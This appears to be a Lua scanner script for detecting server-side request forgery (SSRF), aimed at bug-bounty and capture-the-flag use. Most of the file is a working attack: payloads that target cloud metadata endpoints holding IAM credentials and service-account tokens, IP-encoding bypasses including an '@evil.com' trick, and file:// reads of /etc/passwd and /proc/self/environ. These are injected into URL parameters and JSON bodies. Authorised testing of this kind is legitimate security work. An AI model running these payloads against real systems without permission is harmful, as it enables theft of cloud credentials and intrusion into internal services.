-- ssrf_probe.lua (enhanced)
-- SSRF detection with advanced bypass techniques for real bug bounty/CTF
--
-- Tests:
--   1. Basic internal IP probes (127.0.0.1, 169.254.169.254)
--   2. Cloud metadata endpoints (AWS, GCP, Azure, DigitalOcean)
--   3. SSRF bypass techniques (decimal IP, hex IP, DNS rebinding domains)
--   4. URL-parameter and JSON body injection
--   5. Protocol smuggling (file://, gopher://, dict://)

local base_url = TARGET:match("^(https?://[^/]+)")
if not base_url then return end

-- URL-like parameter names
local url_params = {
    "url", "uri", "path", "dest", "redirect", "next", "target", "link",
    "src", "source", "file", "fetch", "page", "site", "html", "val",
    "proxy", "domain", "callback", "return", "open", "img", "image",
    "load", "request", "navigation", "download",
}

-- SSRF payloads organized by bypass technique
local payloads = {
    -- Basic internal IPs
    {url = "http://127.0.0.1/", sigs = {"root:x:0", "localhost"}},
    {url = "http://localhost/", sigs = {"root:x:0", "localhost"}},
    {url = "http://[::1]/", sigs = {"root:x:0"}},
    {url = "http://0.0.0.0/", sigs = {"root:x:0"}},

    -- AWS metadata (IMDSv1)
    {url = "http://169.254.169.254/latest/meta-data/", sigs = {"ami-id", "instance-id", "local-ipv4", "iam"}},
    {url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/", sigs = {"AccessKeyId", "SecretAccessKey", "Token"}},
    {url = "http://169.254.169.254/latest/user-data", sigs = {"#!/", "cloud-init"}},

    -- GCP metadata
    {url = "http://metadata.google.internal/computeMetadata/v1/project/project-id", sigs = {"project"}},
    {url = "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token", sigs = {"access_token"}},

    -- Azure metadata
    {url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01", sigs = {"compute", "vmId"}},

    -- DigitalOcean metadata
    {url = "http://169.254.169.254/metadata/v1/", sigs = {"droplet_id", "hostname"}},

    -- SSRF bypass: decimal IP encoding (127.0.0.1 = 2130706433)
    {url = "http://2130706433/", sigs = {"root:x:0", "localhost"}},
    -- SSRF bypass: hex encoding (127.0.0.1 = 0x7f000001)
    {url = "http://0x7f000001/", sigs = {"root:x:0", "localhost"}},
    -- SSRF bypass: octal encoding
    {url = "http://0177.0.0.1/", sigs = {"root:x:0"}},
    -- SSRF bypass: IPv6 mapped IPv4
    {url = "http://[::ffff:127.0.0.1]/", sigs = {"root:x:0"}},
    -- SSRF bypass: URL encoding
    {url = "http://127.0.0.1%00@evil.com/", sigs = {"root:x:0"}},
    -- SSRF bypass: redirect (common CTF technique)
    {url = "http://127.0.0.1:80/", sigs = {"root:x:0", "localhost"}},
    {url = "http://127.0.0.1:8080/", sigs = {"root:x:0"}},
    {url = "http://127.0.0.1:3000/", sigs = {"root:x:0"}},

    -- Protocol smuggling (may work if server uses curl)
    {url = "file:///etc/passwd", sigs = {"root:x:0:0"}},
    {url = "file:///etc/hostname", sigs = {}},  -- any non-error response
    {url = "file:///proc/self/environ", sigs = {"PATH=", "HOME="}},
}

local function check_ssrf(resp, sigs)
    if not resp or resp.status >= 500 then return false end
    if #sigs == 0 and resp.status == 200 and #(resp.body or "") > 0 then
        return true  -- For payloads with no specific signature, any 200 with body is suspicious
    end
    local body = resp.body or ""
    for _, sig in ipairs(sigs) do
        if body:find(sig, 1, true) then
            return true
        end
    end
    return false
end

-- Phase 1: Inject into existing URL parameters
if TARGET:find("?") then
    for _, param in ipairs(url_params) do
        for _, payload in ipairs(payloads) do
            -- Try replacing existing param value
            local test_url = TARGET:gsub("([?&]" .. param .. "=)[^&]*", "%1" .. payload.url)
            if test_url ~= TARGET then
                local resp = http.get(test_url)
                if check_ssrf(resp, payload.sigs) then
                    report.finding("critical", "ssrf",
                        "SSRF: " .. param .. " → " .. payload.url:sub(1, 40),
                        "Server fetched internal/cloud resource via parameter '" .. param .. "'. " ..
                        "Payload: " .. payload.url,
                        test_url)
                    return  -- one confirmed SSRF is enough
                end
            end
        end
    end
end

-- Phase 2: Append URL params to paramless target
local target_base = TARGET:match("^([^?]+)")
for _, param in ipairs(url_params) do
    -- Only test first 3 most common payloads for each param (rate limiting)
    for i, payload in ipairs(payloads) do
        if i > 3 then break end
        local test_url = target_base .. "?" .. param .. "=" .. payload.url
        local resp = http.get(test_url)
        if check_ssrf(resp, payload.sigs) then
            report.finding("critical", "ssrf",
                "SSRF via discovered parameter '" .. param .. "'",
                "Server fetched internal resource when '" .. param .. "' parameter was added. " ..
                "Payload: " .. payload.url,
                test_url)
            return
        end
    end
end

-- Phase 3: JSON body SSRF (common in webhook/callback APIs)
local json_endpoints = {"/api/webhook", "/api/callback", "/api/fetch", "/api/proxy", "/api/url"}
for _, endpoint in ipairs(json_endpoints) do
    local url = base_url .. endpoint
    local check = http.get(url)
    if check and check.status ~= 404 then
        local json_body = '{"url": "http://169.254.169.254/latest/meta-data/"}'
        local resp = http.post_json(url, json_body)
        if resp and check_ssrf(resp, {"ami-id", "instance-id", "local-ipv4"}) then
            report.finding("critical", "ssrf",
                "SSRF via JSON body in " .. endpoint,
                "Server fetched AWS metadata via JSON 'url' field",
                url)
            return
        end
    end
end
